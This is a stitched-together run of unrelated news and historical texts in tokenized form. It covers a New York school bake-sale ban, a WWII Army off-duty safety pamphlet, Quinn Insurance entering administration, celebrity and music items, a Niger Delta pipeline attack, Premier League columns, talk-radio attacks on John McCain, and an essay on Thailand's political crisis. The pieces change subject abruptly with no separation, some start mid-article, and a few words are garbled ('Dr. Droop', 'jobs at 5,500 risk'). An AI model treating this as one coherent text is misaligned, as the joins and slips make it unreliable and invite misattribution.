The bake - sale money has also gone to send students to the Adirondacks for a four - day “ nature ’s classroom ” in the summers , quite a benefit for a school where she said 60 percent of the students meet the federal poverty standard .

“ A lot of families in our school do n’t have money , but if they ’re baking something they feel they are contributing , ” said Ms. Neary , a past president of the PTA .
“ If they ca n’t give me money and they ca n’t give me time , they give me some brownies , they give me some cupcakes . ”
School officials say parents have misinterpreted the ban as an endorsement of junk food .
“ We ’re not saying you should eat Doritos , ” said Eric Goldstein , chief executive of School Food and Transportation for the Department of Education .
“ We ’re not telling you what you can feed your child or not feed your child .
If you want to send in with your child 15 cupcakes you can do so .
That probably would n’t be advisable .
But what we ’re talking about is the selling of food .
We ’ve taken a good long look at this . ”
He said that 40 percent of the 1.1 million city schoolchildren are overweight or obese and that restricting the sale of baked goods was just “ one piece in a holistic wellness puzzle , ” coming after the school system had replaced much of the food in its vending machines with items lower in calories , fat and sodium .
Listing the ingredients of food for sale in school is essential to monitoring what students eat , Mr. Goldstein said .
But Laura Shapiro , a food historian and author , said the city ’s argument was “ exactly the kind of thinking that sent us down the road of packaged , industrial junk food in the first place . ”
Big food companies , she said , came “ roaring out of World War II , producing every kind of food and getting people to eat this stuff , ” and “ that was the start of a kind of war between the food industry and American home cooks , which this bake - sale flap shows is not over . ”
She added : “ Americans came to accept a kind of distance between themselves and food .
You would n’t trust it if it was n’t wrapped up and labeled .
Now , farmers ’ markets are in vogue  we love to exalt in that  but for many decades you only bought a bag of potatoes , cut up and wrapped and predone . ”

WAR DEPARTMENT PAMPHLET NO .
21 -10 Pvt. Droop Has Missed The War! PVT .
DROOP is over in the hospital .
When he gets out , he wo n't be Pvt.
Droop any more .
He 'll be Dr. Droop — the army can't use a man with a permanently wrecked leg .
Did he fall on the field of battle on some far - off front ?
Was he trying to save a buddy under raking machine - gun fire ?
Nope !
Pvt. Droop was hit by a truck while he was crossing a street in the middle of the block .
He was in town on a weekend pass .
He has missed the war — the war he wanted to fight .
He has deserted , not from lack of patriotism , but from thoughtlessness .
And he is just one of many droops and 8 - balls in this man 's army .
They are the guys who take unnecessary chances with their lives .
Hundreds of them have already missed the war .
Hundreds more — even thousands — will miss it unless they wise up fast .
How do you rate on personal safety , soldier ?
Try yourself out on the following simple , off - duty safety questions , and see .
DO YOU DRIVE OVER 35 ?
THE wartime speed limit was imposed to conserve rubber and to conserve automobiles , but it also conserves lives .
Speed , in and of itself , causes relatively few accidents , but speed makes any accident more serious .
A crash at 60 miles in hour will not be twice as severe as one at 30 miles an hour .
It will be four times as bad .
That is why these high - speed accidents involving soldiers that you read about usually result in the death of every last man in the car .
DO YOU RIDE IN OVERLOADED CARS ?
IT 'S a high - school kid's trick to overcrowd cars , and men who are engaged in soldiering — the most hazardous occupation on earth — are usually far too smart to take chances when chances are n't necessary .
Even so , a man is mighty tempted to go along in an overcrowded car .
Best advice here is to let your head do your thinking for you .
Few people have survived being thrown from a moving automobile .
DO YOU DRIVE AFTER DRINKING ?
IGNORANCE of the effects of alcohol on a man is almost as common as drinking .
Nobody is immune to the effects .
If you were , there would be no sense in drinking .
You get a kick from alcohol because it enters your bloodstream , and travels at once to your brain .
Your judgment is impaired and so is your ability to manipulate your arms and legs .
This goes for everybody , the so - called good drinker well as for the soldier who gets dizzy if he smells a cork .
Nobody is as good a driver after drinking as when he is sober and that is why one driver in nine invoked in fatal accidents has had a couple of beers or more .
DO YOU CONTINUE TO DRIVE AFTER YOU ARE DEAD TIRED ?
FATIGUE is almost as treacherous a drug as alcohol , at least in its effect on an automobile driver .
That 's why soldiers who make these 700 - and 800 - mile nonstop trips home often never get there .
The driver falls asleep at the wheel and the car charges off the road or into an oncoming machine without slackening speed .
Even truck drivers who push the big jobs over the roads day in and day out suffer from fatigue .
They know the danger best .
That is why they stop and get out of the car and exercise to wake themselves up .
That is why they occasionally pull off to the side of the road and sleep for an hour or two .
Saves time in the long run .
Saves lives .
DO YOU WALK ON THE RIGHT - HAND SIDE OF COUNTRY HIGHWAYS ?
IF YOU DO , you 're really asking for it , soldier !
Everything is against you , because your back is to approaching cars and you are at the mercy of every near - sighted , drunken , sleepy , indifferent driver on the road .
If you walk on the left , facing oncoming vehicles , you can watch cars approach and if they seem to be coming too close or are otherwise suspicious looking you can jump aside and let them pass .
DO YOU CROSS STREETS IN THE MIDDLE OF THE BLOCK ?
IF YOU DO , you are overlooking a very important fact — the fact that between intersections the driver is n't expecting to encounter people on foot .
It 's between intersections that the driver lights a cigarette , or window - shops , or speeds up to make time .
And there you are .
Is it surprising that almost half the pedestrians killed are struck down between intersections ?
This is true even though the overwhelming majority of persons cross where they ought to , at crosswalks .
DO YOU DISOBEY TRAFFIC SIGNALS WHEN WALKING ?
DO YOU cross on the green and wait on the red , just as drivers do ?
If not , you are a droop , and everything you can think up to say in your own defense will be just so much eyewash .
Since the reasons for observing the lights are plain , we 'll skip an explanation .
DO YOU STAND ON THE HIGHWAY TO HITCHHIKE A RIDE ?
AND , as other soldiers line up for the same purpose , do you keep edging farther and farther out into the highway hoping you will be seen first ?
Did you ever happen to be in such a group , perhaps closing half the highway to drivers , when a drunk came along and knocked the soldiers over like so many tenpins ?
It has happened before and it will happen again unless soldiers learn three things : ( 1 ) It is dangerous to stand in the probable path of automobiles , ( 2 ) it is undignified for a man representing the U.S.
Army to be begging a ride or anything else , and ( 3 ) it is against Army regulations to hitchhike .
DO YOU RISK YOUR LIFE AFTER DARK ON THE STREETS ?
YOU DO — if you assume that just because you can see an oncoming car , the driver of that car can see you .
The fact is , he frequently can't .
Not enough light is reflected by a soldier 's uniform to reach the driver 's eyes until too late .
That is how many a soldier has been killed .
When you are on foot , assume the full responsibility for your own safety .
To be safe at night , take it for granted that every driver is stone blind .
If he does n't see you , he might as well be .
DO YOU GO SWIMMING ANY PLACE AT ANY TIME YOU FEEL LIKE IT ?
THERE is no better sport for the soldier than swimming and no more dangerous sport if the soldier does n't use his head .
Among the common mistakes that result in drownings are : Swimming within 2 hours of eating a heavy meal , plunging into cold water when overheated , diving into water without knowing its depth , swimming alone , swimming without being familiar with tide and undertows , swimming at any unguarded beach .
Soldier , avoid these dangerous practices .
DO YOU GO TO FIRETRAP ROADHOUSES AND CABARETS ?
THE temptation to patronize firetrap dance halls and cabarets is especially great at stations where entertainment is scarce .
Soldiers , when confronted with this problem , should register a complaint with the station commander who , by merely threatening to declare the joint out of bounds , can quickly induce the proprietor to install the necessary safeguards .
The Boston tragedy , taking 488 lives , including many service men was one of the worst in U.S. history .
The stage is all set for repetitions in hundreds of places .
ARE YOU HABITUALLY GUILTY OF A LOT OF DANGEROUS ACTS ?
WHAT are they ?
Well , one - arm driving of an automobile is an example ; so is walking around on streets after drinking quite a bit .
Running for a bus without watching for cars has resulted in the death of too many soldiers .
Soldiers have burned to death in forest fires caused by their own carelessness with matches , cigarettes , and campfires .
They have been decapitated by sticking their heads out of railroad car windows , and have lost arms that way , too .
They have caused huge forest and crop fires by pitching lighted matches and cigarettes from train windows .
Other soldiers have died in these fires .
A soldier 's got to use his head all the time to keep himself and his buddies safe .

The High Court has appointed two joint provisional administrators to Quinn Insurance Ltd .
Mr Justice John Cooke made the order following an application by lawyers on behalf of the Financial Regulator .
The application was made under the 1983 Insurance Act .
Michael McAteer and Paul McCann from Grant Thornton have been appointed by the High Court to act as the two joint provisional administrators .
They have been instructed to begin their work immediately .
Speaking on RTÉ's News at One , Mr McCann said customers in Ireland would not be affected and a decision on whether to sell the company would be made in the future .
The court heard the Regulator took the action following serious concerns about the way the group was managing its affairs .
The administrators will have the option of seeking well - capitalised new owners for the business .
The Regulator said Quinn Insurance 's Irish policy holders can continue to renew policies , carry out new business and make claims in the normal way .
It said the appointment of administrators would better protect policy holders .
Regulator Mathew Elderfield said he does have concerns about the financial state of the Quinn Group , but he said there was a reasonable prospect that the administrators will find a buyer .
Mr Elderfield said that it emerged last week that the strength of Quinn Insurance had been over stated by around € 450m .
He said that if there was a shortfall in Quinn Insurance , a levy would be placed on all general insurance premiums .
Mr Elderfield said the company has funds to pay claims at present but the exact position or any potential shortfall would be managed by the administrator .
The information , which came to light last week and led the Regulator to go to the High Court , was provided by a source that the regulator said he would not be identifying at this time .
The regulator now has an on - site presence in the company 's offices .
The administrators will only run the general insurance business , which offers home , health , motor and public liability insurance .
Decision puts jobs at 5,500 risk - Quinn board
The board of the Quinn Group , which owns Quinn Insurance , has reacted angrily to the regulator 's action .
It has sent a letter to all Government ministers warning that the regulator 's move would put 5,500 jobs in Ireland at risk unless ' immediately reversed ' .
The letter describes the regulator 's action as ' highly aggressive and unnecessary ' , adding that it would make the repayment of its outstanding debt extremely difficult .
It says Quinn Group is on target to make profits of up to € 1.2bn over the next three years and adds that the group is ' on schedule ' to pay back all money borrowed from financial institutions .
The board asked why the regulator was taking this action now when it and its insurance subsidiary were in a position to meet all their cash obligations .
The Quinn Group says being placed in provisional administration 'is deeply disappointing in the context of the continued profitability of the group which is currently in excess of € 20 m per month ' .
' We feel that this issue could have been resolved to the benefit of all in a relatively short space of time and we will be working with the regulator and the provisional administrators to resolve all outstanding matters , ' read the statement .
Quinn says the business continues to trade as a going concern and that all other group businesses are unaffected .
Minister for Health Mary Harney has said the appointment of administrators to Quinn poses no immediate concern to the health insurance market .
She told the Select Committee on Health and Children that Quinn has 23 % of the private health insurance market .

Miley Cyrus [ / artist ] stopped by " Good Morning America " on Monday ( March 22 ) and followed up her New York City press tour with a stop by " The View , " where once again the topic of discussion was the teen star 's love life and relationship with [ movie id = " 423507 " ]
" The Last Song " [ / movie ] co-star Liam Hemsworth .
" Well , I like him very much ... I love him .
He is a great person .
He 's someone I 'm holding onto because we very much connect and we 're both very ambitious and have some of the same goals , " she told the ladies .
" My mom loves him and thinks he 's wonderful . "
In the sit - down interview , Cyrus also responded to comments she made in Teen Vogue where she said she and Hemsworth were " deeper " than most people .
" OK , it 's not that I 'm smarter or better — the things that matter at the end of the day matters to us , " she clarified .
" We celebrate every day that we have this job to do and a new task to tackle . "
Even though Cyrus performs on television and in front of audiences of thousands , she admitted that meeting Hemsworth 's parents in his native Australia made her nervous .
" I perform for 80,000 people , and I was nervous on the plane , " she said .
" I 'm not getting married !
Do n't get crazy !
I think it was kind of a respect thing .
He has no family in L.A. — his family is 20 hours away . "
But not all the talk was about Hemsworth — during the chat , Cyrus revealed she has a new album dropping this summer .
" I have a record coming out in June , and that 's going to be the last thing I do in music for a while , " she shared .
" I just want to do films ' cause I like being someone else .
My music is kind of like my diary .
I 'll always do that ...
I just feel like the music industry is n't as positive as I 'd like it to be . "
After attending one of the National ’s High Violet - related shows at the Bell House a couple of weeks ago , I sorta went off on the water imagery in Matt Berninger ’s lyrics .
“ Bloodbuzz Ohio , ” a song we heard in earlier form a year ago , is n’t as obviously drenched or drowned as the others , though you do get the water that makes up most of your blood ( and body ) plus Ohio and its rivers .
The song debuted on BBC radio earlier today .
The label passed along a higher quality non-ripped version of the track .
You might ’ve expected “ Terrible Love ” as High Violet ’s lead single after that stirring Fallon performance , but as mentioned , this one ’s been around , so no real surprises .
Take a listen to what it ’s become .
The National – “ Bloodbuzz Ohio ”
High Violet is out 5/11 via 4AD .
EAST ORANGE — A New Jersey man 's ex-wife testified today that he sexually assaulted their five daughters and impregnated three of them , according to a report by NorthJersey.com .
The man said his ex-wife believed the world was ending and that his offspring would be the sole survivors , the report said .
The alleged assaults occurred at an abandoned funeral home in East Orange , the report said .
LAGOS — Nigerian militants calling themselves the Joint Revolutionary Council ( JRC ) said Sunday they had attacked a major Shell oil pipeline in the volatile Niger Delta , in a statement obtained by AFP .
The group said the overnight attack “ successfully disabled the trunk line belonging to Shell in the swamp of Obunoma ” in the oil - rich Rivers State .

Shell was unable immediately to confirm the attack .
The JRC said it was “ reinvigorated as a result of series of consultations with patriotic groups in our territory . ”
The main militant Movement for the Emancipation of the Niger Delta ( MEND ) announced last week it was calling off a three - month - old truce with the government .
A key demand of the militants is that local communities benefit from the region ’s oil wealth .
Oil is Nigeria ’s economic mainstay , raking in some 95 percent of export earnings and accounting for about 85 percent of budget requirements for the OPEC member country .
The unspoken conspiracy against Arsenal
Arséne Wenger says he does n't believe in coincidence .
Three horrifically broken legs in the space of four years would be enough to make most managers suspect something might be a little off .
Wenger is right : there is a conspiracy against his team .
But it 's not overt nor clearly articulated ; it comes from a cultural enmity rather than a personal one .
Ever since a nationwide TV audience witnessed Wolves beat Honved on a pitch watered into a swamp by Stan Cullis in 1954 – through Charles Hughes ( " we have nothing to learn from Brazil " ) , Terry Butcher with blood on his shirt and England 's Brave John Terry – there has been a powerful lobby in English football following the premise that aggression and physical power can overcome superior technique .
Wenger 's Arsenal play in a way that is unusual even at the top level : no other Premier League team keeps the ball so jealously in midfield areas .
All three catastrophic injuries have happened at away grounds – Sunderland , Birmingham and now Stoke – against teams with no recent history of playing in Europe , against , say , the ball - hogs of the Portuguese league .
Arsenal are the only team they meet who keep the ball like this .
Everyone who visits Premier League grounds will know the biggest cheer of the day is often for a heavy , disruptive tackle after a period of patient possession by the away team .
The tackle by Ryan Shawcross was n't high or carried out with studs showing , but it was excessively forceful , a statement - tackle , intended to assert his own - legitimate - physical power and his team 's style of play .
This kind of challenge happens to Arsenal far more often than other teams .
They suffer more injuries as a result .
It 's a culture clash .
Shawcross is also , in a far more minor way , a victim here , as is Tony Pulis as a coach from the same culture that teaches that the best way to combat superior ball retention is a traditional test of mettle .
It 's not easy being a winger
Managers do n't like each other : and it's fun
No other outfield player is exposed like a winger in the television age , and at a time where space often only ever appears on the flanks .
Perhaps 10 times in a single match a winger will be asked both to beat his man and to " deliver " .
Failure is greeted with snarling team - mate close - ups and commentary box sighs .
It 's a very difficult position too : even at the top level wingers will tend to have pace but inferior delivery , or delivery but no pace ( the Lennon / Beckham dilemma ) .
No wonder those that have both stand out : Luis Figo , Ryan Giggs , the young John Barnes .
This weekend the unspectacular , non-telegenic Antonio Valencia continued to show that having enough pace , and a good enough delivery can be a devastating combination .
Four times in four matches Valencia has provided a cross for Wayne Rooney to score with his head .
Beware through : it is an unforgiving position : on Saturday Charles Nzogbia was taken off by Roberto Martinez at half time after twice wasting the chance to cross having brilliantly engineering space for himself .
Adam Johnson has started very well playing wide for Manchester City .
But should his form tail off he is in a uniquely exposed outfield position .
We will notice .
No hiding out wide .
Wingers have it hard .
The spat between Rafa Benítez and Sam Allardyce is childish and faintly embarrassing .
Benítez was responding to criticism of his own team 's style , but his comments about Blackburn refusing the opportunity to play like the 1970 Brazil World Cup team and instead feeding their aerial strengths seemed undignified in victory .
The most interesting point is that suddenly we seem to have a league in which a significant number of managers actually dislike each other .
Few weekends pass without some kind of snipey dugout altercation .
Maybe it's to do with the second generation of foreign managers taking to the Premier League with fewer niceties , less of a sense of being guests and more freedom to challenge the cosy , boozy , boot - room culture .
Put like that , it sounds an appealing development .
Maybe Benítez 's comments were ungracious .
Perhaps there was a sense of breaking code .
But he 's probably got a point .
And it 's more fun than the traditional closed - shop backslapping .
Hail the new grouchiness .
Alan Hansen : decisively wrong
Bellamy the beautiful gargoyle
A terrible weekend for the BBC 's headline pundit .
All very well .
Communicating in , single .
Heavily emphasised .
Nouns .
Like pace .
Power .
Penetration .
And Countdown .
Clark Carlisle .
Never should have been on .
But when you 're off you look a bit silly .
First of all Hansen made the ridiculous claim that Carlisle being on a pre-recorded ( note : not live ) game show on Wednesday and Thursday had something to do with his mistakes against Portsmouth , as though sitting around eating Haribo star mix and playing Call of Duty would have been better preparation than some harmless mental gymnastics .
Then came the attempt to " call " the Carling Cup final .
Richard Dunne : reliable , solid and dependable .
Villa to win .
Rooney wo n't influence the game .
Everybody makes mistakes and Hansen is in the firing line every weekend .
But for some reason it 's always particularly enjoyable when he 's wrong .
Craig Bellamy : on second thoughts .
Previously this column may have given the impression it considered Bellamy a gobby , arrogant , occasionally violent product of the grisly Premier League age .
It now appears he is in fact a fiercely honest , searingly incisive , tell - it - like - it - is victim of a culture that ...
Hang on .
Perhaps that 's going a bit far .
But there is something about Bellamy , a hideously unappealing but still strangely attractive and compelling figure .
He is the loudmouth whose opinion you actually want to hear , because it 's compellingly honest .
" Everybody in football knows what the guy is like , " Bellamy said on Saturday and you wanted to hear more .
Give me more Bellamy .
Let me hear the truth .
Bellamy has in the past fallen out with Graeme Souness and Alan Shearer : could he be the voice of the anti-macho and the anti-bland , antithesis to the antiseptic ?
Then , you remember the other stuff .
The golf club , the assorted public order arrests .
Bellamy will have to remain an alluring gargoyle , a guilty pleasure , and a stopped clock that tells the right time once a day .
But he is definitely fun .
Conservative radio hosts see Arizona incumbent Sen. John McCain losing to challenger J.D. Hayworth by a landslide , despite early polls to the contrary .
| AP photo composite by POLITICO Talk - show titans take on McCain
Early polls suggest Arizona Sen. John McCain leads former Rep. J.D. Hayworth by a healthy margin in the GOP primary .
Among conservative radio talk show hosts , however , McCain is losing by a landslide .
As McCain gears up for a vigorous challenge from the former six - term House Republican , national conservative talkers are picking up where they left off in the 2008 presidential campaign , blasting McCain as insufficiently conservative and unloading on him with all the bombast they can muster .

Hayworth , himself a former talk radio host , is the beneficiary .
“ This is a race about a conservative versus a phony , so let me be the first national host to say it , ” blared best - selling author and radio personality Mark Levin on his nationally syndicated program .
" McCain is not a solid conservative .
You want to send a signal that will be heard all over the world ?
Elect J.D. and defeat McCain , " Levin concluded .
Earlier this week , popular Fox News television and radio host Glenn Beck — who once said McCain “ would 've been worse for the country than Barack Obama ” — offered his unvarnished take on the Arizona senator during a radio interview with Sen. Jim DeMint ( R - S.C. ) .
" I 'm convinced that John McCain is going to be one of the guys who pushes through a health care compromise , " complained Beck .
" And I do n't want any health care through the federal government .
Because you know and I know , Senator , that they 're going to build this damn machine whether we like it or not , " he continued .
" And they 're going to build it one piece at a time , and a progressive like John McCain will help them build it , " Beck asserted .
When DeMint signaled he was staying out of the Arizona primary , Beck expressed a sigh of relief .
" This is great news to me .
So you are not endorsing him or helping him in Arizona ? "
Beck asked .
" No , I 'm not .
I know J.D. well , and they can have their own race , " DeMint replied .
That conservative talk radio would be focused on the Arizona GOP Senate primary six months before it ’s due to take place is a testimony to the hard feelings some conservatives have when it comes to the 2008 GOP presidential nominee .
The nationally syndicated Michael Savage , who " sadly " endorsed McCain in 2008 but at the same time called him a " dunce , a dummy and a walking schmuck , " has also lined up behind Hayworth .
“ We know McCain is a shame .
We know McCain threw the election to Obama , ” Savage said Monday , when he hosted Hayworth on his show .
Toward the tail end of a 13 - minute long interview where Hayworth welcomed the help of the “ Savage Nation , ” the host granted his blessing , saying “ I believe you should win , and I believe the listeners will support you , J.D. Hayworth . ”
Some of the listening audience is only too happy to hear McCain get whacked .
“ Part of me just wants to be a spectator and sit back and watch .
I ’ll have no problem watching McCain fight for his political life , " said Erick Erickson , founder of the conservative blog RedState.com .
Republican strategist John Weaver , a former McCain adviser and close confidant , dismisses the effect of the talk show attacks .
" They 're for ratings .
They 're not representative of the Republican Party .
They 're businesspeople .
They 'll rattle their listeners , but they do n't elect anybody .
And it 's a shame because John 's the conservative in the race .
Tell me the past people they 've elected , " Weaver contended .
“ If you ’re not a listener to them , you ’re not going to be influenced .
If you are , you already have your mind made up , " he added .
Despite the potshots McCain has taken , there are some lonely pockets of McCain support on conservative talk radio .
Bill Bennett , the radio talk show host who served as President Ronald Reagan 's education secretary , has broken with his colleagues and embraced McCain .
" There 's a primary in Arizona .
I usually do n't get involved , but sometimes I do , " Bennett told his audience recently .
" I 'll be involved in this one .
I 'll be supporting John McCain and not J.D. Hayworth . "
“ Hayworth ’s views , if you put them both on paper , are probably closer to my views , but I ’ve got to support McCain because he ’s the man .
He ’s the man who stands in the breach , stood in the breach on Iraq .
He ’d rather lose the election than the war .
He ’s the only guy who really stood up last week that I noticed , probably a couple others , on this " do n’t ask , do n’t tell . "
He would want my support ; he would ask for it , I believe , and he ’s going to get it . ”
Townhall.com 's Michael Medved also sided with McCain , telling his radio listeners Monday that Hayworth 's " scandal - scarred background " makes him an " unworthy primary challenger . "
" His deep involvement in the Abramoff lobbying disaster , and six - figure payments to his wife through a political action committee , led voters to scorn Hayworth in 2006 , " Medved opined , raising a 2006 investigation of a campaign contribution Hayworth received from disgraced lobbyist Jack Abramoff .
" In the unlikely event that Hayworth won the primary , he'd be unelectable in the fall — just as in his last congressional race — handing a crucial Senate seat to Democrats , " he concluded .
The one conservative radio talk titan who has n’t yet indicated a preference in the McCain - Hayworth showdown also happens to be the most influential : Rush Limbaugh .
“ At the end of the day , it ’s Rush Limbaugh people pay attention to , " said Erickson , who prefers Hayworth but has n't decided if he 'll make a public endorsement .
" If a voice like Limbaugh were to get involved , you could see J.D. rake in a lot of money and a lot of volunteers . ”
Conservative blogger Matt Lewis agrees that Limbaugh is the most notable host to keep any eye on .
" He has never liked McCain and has recently been critical of him , " Lewis noted .
Few expect Limbaugh will suddenly embrace the four - term senator .
" Rush has hammered him every day for 10 years , " Weaver lamented .
Yet even if the provinces of conservative talk radio are n’t a natural constituency for McCain , he ca n’t afford to cede it to Hayworth .
McCain must still closely monitor the radio rhetoric to avoid the fate of Dede Scozzafava , the upstate New York GOP special election nominee last year who became a national punching bag for conservative radio hosts , and Florida Gov. Charlie Crist , who 's been harangued by conservatives for his hug with President Obama .
" There is a very dangerous tipping point , and McCain must be very , very careful with the narrative , " Lewis said .
" The good news is that Hayworth is not Marco Rubio and McCain is not Crist .
But there is a tipping point . "
In recent decades , Thailand has been running one of the world ’s most successful national marketing campaigns .
Building on its reputation for hospitality , beautiful beaches and splendid food , the tourism ministry has created an image of Thailand as an exotic paradise where travellers are ushered from spa to floating market to Buddhist ruin , all beneath a never dimming tropical sun .
In 2008 , the country had more than 14 million visitors – neighbouring Cambodia had two million – and tourism was the country ’s biggest source of foreign exchange .
Sleepy islands like Koh Samui and Koh Chang are fishing for tourists where once they fished for sea bass ; even the smallest Thai towns seem to have boutique hotels offering wi-fi and fancy coffee .
Now , however , the number of tourists visiting Thailand is beginning to level out and even to drop , perhaps because they have noticed what many Western governments , focused on the situations in Pakistan , Iraq and North Korea , have ignored : Thailand , once known as one of the most stable democracies in Asia , is in political and economic crisis .
The scale and speed of the meltdown have been staggering .
In 2001 , I travelled in southern Thailand , through the three provinces near the Malaysian border .
Most of the inhabitants there are Muslims , ethnically Malay people who speak their own dialect , and the region feels more like Malaysia than Buddhist central Thailand .
At that time , the south seemed quiet .
Women sold crispy fried chicken from handcarts at the side of the road , and Buddhist monks and Muslim prayer leaders walked down village streets .
In Pattani , one of the larger towns , Western backpackers wandered through the market , where they stared at plates of biryani and mounds of jackfruit .
When I returned to the region five years later , it resembled a war zone .
Militants opposed to the control of the Buddhist - dominated government in Bangkok had bombed markets , schools , monasteries , police stations and other public buildings ; they kidnapped soldiers and local citizens and beheaded innocent people ; they even attacked mosques , killing imams and worshippers .
Many southerners now instinctively kept away from packages or baskets set down on the street , fearing they might contain improvised explosive devices .
In response to the militants ’ campaign , Thai security forces had set up checkpoints , machine - gun nests and roadblocks .
Nearly every shop closed at dusk ; many had closed for good for lack of customers .
For the five days I was in the south , I did n’t see another foreigner .
The rest of Thailand has since followed a similar pattern .
In September 2006 , following months of street protests , the military launched a coup against the elected government , the first such coup in 15 years .
Since then , violent demonstrations – some of them against the military regime and the government it installed , some in support of it , some interested only in causing chaos – have come to dominate life in Bangkok .
In spring last year , demonstrators armed with Molotov cocktails and guns clashed with police across the capital , setting fire to buildings and causing at least six deaths and hundreds of injuries .
At roughly the same time in the resort town of Pattaya , two hours south - east of Bangkok , demonstrators attacked the prime minister ’s car , then smashed their way into the fancy hotels hosting a major regional summit , embarrassing the government by forcing the participating leaders to flee and the proceedings to be abandoned .
Meanwhile , Thailand has junked the progressive constitution written in the 1990s , when , after the demise of the previous military regime , the country seemed to have built a reasonably stable democracy .
Worse still is the return of the armed forces as a powerful force in politics .
‘ I do n’t know how we get out of this situation , ’ a senior Thai diplomat conceded .
‘ It seems like a spiral . ’
From the perspective of the elites in Bangkok , the breakdown began early in 2001 , with the election as prime minister of Thaksin Shinawatra , a tycoon and a politician unlike any who had come to power before in Thailand .
With promises of huge amounts of aid to the poor and a sophisticated advertising campaign that presented him as a Michael Bloomberg figure , a billionaire businessman who knew how to get things done , Thaksin ’s party won the election by one of the largest margins in the country ’s history .
In office , he fulfilled some of his promises to the rural poor , who are concentrated in the north and north - east , comprise a majority of the population , and voted overwhelmingly for his Thai Rak Thai ( Thais Love Thais ) party .
He delivered inexpensive healthcare and oversaw a programme to distribute micro-loans to every village , designed to help the poor start up small businesses .
These policies were significant : the rural poor had barely benefited from the economic boom of the 1980s and early 1990s , which had transformed Bangkok from a city of canals and floating markets into a high - rise capital of megamalls , office towers and latte bars .
According to Michael Montesano , one of the most astute observers of Thailand , by 2007 household income in Bangkok was roughly three times that of households in the rural north - east .
Indeed , while the urban middle classes have benefited from trade and globalisation , the rural poor have seen the agricultural sector collapse in the face of competition from China and giant Western agribusinesses .
Thaksin ’s populist policies made much of this urban / rural , rich / poor divide .
He has a demotic charm that enables him to communicate effectively with the poor and on the campaign trail farmers treated him like a god .
In contrast to traditional Thai politicians , who expect people to grovel to them , Thaksin , despite his massive ego and equally massive fortune ( Forbes estimated him to be worth $ 2.2 billion in 2006 ) , managed to pretend to be the people ’s servant .
Arriving in villages in the north , his home region , he would make a humble wai , the Thai version of a bow , then listen to the most trivial complaints .
It worked .
In 2005 , voters gave his party an even larger majority than in 2001 ; he and his allies now controlled 374 of the 500 seats in parliament .
By his second year in office , Thaksin had more than tripled government expenditure on anti-poverty programmes , and over his time in office the percentage of the population living in poverty fell by nearly half .
But his policies also had a darker side .
As Montesano notes , in many ways Thaksin resembled a Latin American caudillo more than a bland and consensus - building Thai leader .
Not long after his election in 2001 , he began dismantling the country ’s democratic institutions .
His allies bought stakes in many of the largest publishing groups and television stations .
Many newspapers became slavishly pro-Thaksin , and the few journalists willing to pursue stories that did n’t reflect so well on him often found themselves frozen out .
When , in 2004 and 2005 , I visited the Bangkok Post , a leading English - language daily , I found that many investigative reporters had been assigned to interview local celebrities or encouraged to write stories that did not impugn the prime minister and his allies .
Thaksin ’s administration forced long - serving civil servants to retire , replacing them with cronies , and some of his relatives were appointed to key positions in the armed forces – his cousin became supreme commander of the military .
Facing charges of illegally concealing his assets , Thaksin was narrowly acquitted by the constitutional court ; afterwards several judges alleged that intense political pressure had swung the decision .
With his encouragement , a cult of personality was built up around him : billboards of his grinning face adorned highways and buildings across the country , angering the monarchists by taking up space usually reserved for portraits of the beloved monarch , Bhumibol Adulyadej .
Worst of all were Thaksin ’s policies in the south of the country .
In Tearing Apart the Land , Duncan McCargo gives a thorough explanation of why unrest began in the region , and why it has spread .
The southern provinces essentially formed an independent state until the turn of the 20th century , and have chafed at Bangkok ’s rule ever since .
In the 1960s and 1970s , separatists launched a spate of violent attacks , but by the 1980s and 1990s Bangkok seemed largely to have pacified the region , by directing more state money there and responding better to southerners ’ complaints .
Thaksin reversed much of this .
He dissolved the longstanding local council charged with dealing with these complaints , and increased the presence of the security forces , while a generation of southerners fell under the sway of militant leaders and took up the separatist cause .
In 2001 , several policemen were shot dead , apparently by snipers .
The insurgency grew rapidly .
According to McCargo , ‘ the security policies of the Thai state in the south were a lamentable catalogue of criminal blunders , negligence , incompetence , lack of co-ordination and sheer misdirection …
The militant movement consistently gained the upper hand in the southern border provinces , placing the Thai security forces firmly on the defensive . ’
Initially , there was little to suggest that the insurgency had links to any sort of global Islamist movement , but the subsequent crackdown seems to have helped to transform a local conflict into one with international ties .
( This is becoming a familiar pattern : in Somalia , American and Ethiopian incursions helped Islamists turn a local power struggle into a cause célèbre for militants around the world . )
The Thai army ’s response to the crisis in the south attracted the interest of Arab satellite TV stations , Islamist websites , charities and foreign militant groups , to whom some southerners may have looked for guidance .
Yet , as McCargo notes , the conflict has been largely ignored by the Western press , and the Thai government , eager to keep on attracting tourists , has played it down .
The crisis soon escalated , with each move by the militants provoking a harsh and often counterproductive response .
In April 2004 , more than 30 suspected militants holed up in Krue Se Mosque , one of the best - known religious centres in the region .
Although the minister of defence ordered the security forces to negotiate a peaceful resolution , they tossed grenades into the mosque and then stormed it , killing more than a hundred people and destroying much of the building .
‘ Many of the dead , ’ McCargo reports , ‘ had apparently been beaten and shot repeatedly . ’
Later that year , the army blundered again .
After a demonstration in the village of Tak Bai , hundreds of local men were rounded up .
They were tossed , hands bound , into crowded trucks , and driven away ; at least 85 men suffocated inside the sweltering vehicles .
After these massacres , insurgents began targeting local officials , soldiers , policemen , monks and even primary school teachers .
They burned down schools , and kidnapped and beheaded labourers walking to work .
The Rand Corporation estimates that between January 2004 and August 2007 , militants in the south detonated no fewer than 1189 bombs and took part in 3253 drive - by shootings and assassinations .
Southern Buddhists , now a terrified minority , set up paramilitary groups themselves , making the atmosphere even more tense .
Bangkok had imposed martial law in the region in 2004 and when I visited in 2006 , my contacts complained incessantly about men being taken from their homes at night by members of the security forces , never to return .
McCargo claims that , in one village , a Muslim family of nine was shot dead at point - blank range , probably by the security forces .
Human rights groups claim that the security forces have tortured suspects and beaten imams to death : a well - known local human rights lawyer called Somchai Neelapaichit vanished .
I saw secondary school students walking home in large groups , the better to guard against being seized by insurgents or the army .
Thaksin sparked an almost irrational level of anger among Thailand ’s traditional elites – monarchists , Bangkok professionals , big businessmen – but not because of his actions in the south .
Some of these people , who had fought for decades to modernise and democratise the country , abhorred his autocratic style .
Others could n’t stand his confrontational methods : he did n’t solve problems in the traditional Thai way , through backroom deals that allowed everyone to save face .
Many feared too – correctly , as it turned out – that once the rural poor had seen the real power of their vote , they would never again tolerate the old oligarchic order .
Yet the traditionalists did not respond by trying to strengthen the institutions Thaksin had subverted – the media , for example , or the courts – or by rebuilding the Democrat Party .
Instead , they chose to tear Thai democracy apart in order to bring Thaksin down .
